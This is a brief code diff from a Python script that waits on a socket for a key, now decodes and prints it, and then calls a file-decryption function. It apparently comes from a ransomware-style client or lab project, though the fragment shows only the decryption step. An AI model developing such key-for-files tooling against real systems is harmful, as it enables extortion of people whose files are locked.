@@ -110,5 +110,6 @@ while True:
                 print('Thread worked!!!')
                 
                 # recv waits for new input of key to decrypt
-                key = s.recv(4096)
+                key = s.recv(4096).decode("Utf-8")
+                print(key)
                 decryptFiles(key)
